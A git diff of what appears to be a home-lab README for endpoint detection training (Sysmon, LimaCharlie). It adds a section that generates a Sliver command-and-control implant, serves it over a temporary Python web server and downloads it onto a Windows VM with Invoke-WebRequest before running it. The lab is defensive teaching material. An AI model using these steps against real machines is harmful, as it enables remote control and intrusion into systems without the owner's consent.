@@ -113,7 +113,7 @@ This is actually optional in this project, but it’s a must-have analyst tool f
 1. **Launch an Administrative PowerShell console for the following commands:**
 
 - Click the “Start” menu icon
-- Type “powershell” into the search bar within the Start Menu
+- Type “Powershell” into the search bar within the Start Menu
 - Click “Windows PowerShell” and click “Run as administrator”
 
 2. **Download Sysmon with the following command:**
@@ -252,6 +252,48 @@ Explore the LimaCharlie web interface to learn more about what it can do!
 
 
 <details>
-  <summary><h2><b>Section : </b></h2></summary>
-  Description
+  <summary><h2><b>Section 5: Generate the Command&Control payload </b></h2></summary>
+  Either from your SSH session or directly from your Ubuntu Server, take the following actions:
+
+  1. Access root shell and change dir to Sliver install
+
+```
+sudo su
+cd /opt/sliver
+```
+
+  2. Launch Sliver server
+
+```
+sliver-server
+```
+
+  3. Generate C2 session payload. Use your Linux VM’s IP address
+```
+generate --http [Linux_VM_IP] --save /opt/sliver
+```
+
+  4. Confirm the new implant configuration
+```
+implants
+```
+
+  5. Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.
+```
+exit
+```
+
+  6. To easily download the C2 payload from the Linux VM to the Windows VM, use this python trick that spins up a temp web server
+```
+cd /opt/sliver
+python3 -m http.server 80
+```
+
+  7. Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server
+```
+IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+```
+
+Now would be a good time to snapshot your Windows VM, before we execute the malware.
+
 </details>
